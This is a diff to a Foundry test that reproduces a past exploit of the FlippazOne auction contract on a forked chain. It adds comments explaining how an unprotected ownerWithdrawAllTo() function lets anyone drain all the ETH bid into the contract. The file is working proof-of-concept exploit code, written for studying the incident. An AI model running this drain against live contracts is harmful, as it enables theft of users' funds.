@@ -16,11 +16,22 @@ contract ContractTest is Test {
     function testExploit() public {
         address alice = cheat.addr(1);
         emit log_named_uint("Before exploiting, ETH balance of FlippazOne Contract:", address(FlippazOne).balance);
+
+        // EXPLOIT STEP 1: Deposit funds via bid() to increase contract balance (in real hack, contract already held prior bids).
+        // This demonstrates that `bid` (payable) succeeds for anyone and adds to address(this).balance.
+        // The bid also updates highestBid/highestBidder, but that is irrelevant for the drain.
+        // Code reference: FlippazOne.sol:1248 (bid requires auction active but does not protect withdrawals).
+        // At fork block 15083765, auction was active with prior ETH in contract.
         cheat.prank(msg.sender);
         FlippazOne.bid{value: 2 ether}();
         emit log_named_uint("After bidding, ETH balance of FlippazOne Contract:", address(FlippazOne).balance);
 
-        //Attacker try to call ownerWithdrawAllTo() to drain all ETH from FlippazOne contract
+        // EXPLOIT STEP 2: Call the unprotected ownerWithdrawAllTo() which immediately drains 100% of contract balance.
+        // No onlyOwner check, no auction-ended check, no msg.sender validation.
+        // Directly transfers via low-level call the entire balance to attacker-controlled alice.
+        // This succeeds because the function is `public` (see VULNERABILITY annotation in FlippazOne.sol:1354).
+        // Attacker profits the sum of all bids ever sent to the contract (auction proceeds).
+        // Code reference: FlippazOne.sol:1359 (ownerWithdrawAllTo) and the call at interface.
         FlippazOne.ownerWithdrawAllTo(address(alice));
         emit log_named_uint("After exploiting, ETH balance of FlippazOne Contract:", address(FlippazOne).balance);
         emit log_named_uint("ETH balance of attacker Alice:", address(alice).balance);
